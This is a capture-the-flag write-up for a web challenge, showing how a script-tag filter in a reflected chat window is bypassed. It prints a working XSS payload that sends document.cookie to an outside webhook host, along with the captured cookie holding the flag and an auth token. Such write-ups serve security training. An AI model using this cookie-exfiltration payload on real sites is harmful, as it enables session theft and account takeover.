# Cookie World Order
## Description
Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits. Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!

## Solution
The website contains a "livechat" window and a video of a cauliflower. Messages typed into chat are reflected. However entering `<script>` results in the message changing to `HACKER ALERT!`. Other tags such as `<img>` and `<foo>` don't exhibit this behavior. We can reuse the webhook site from `web-gov-xss`. Inspecting the source shows that the site uses `jQuery` and the `fetch` API. We can add JS to `<img>` error handler and call `$.get` / `fetch` to perform a network request.

```html
<img src=x onerror='fetch("https://webhook.site/f610b3ae-9ba3-44d1-84f2-c5c8d7b7ec64?"+encodeURIComponent(document.cookie))'>
```

The flag is passed in the query string
`flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r};_auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz`

### Flag
`CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`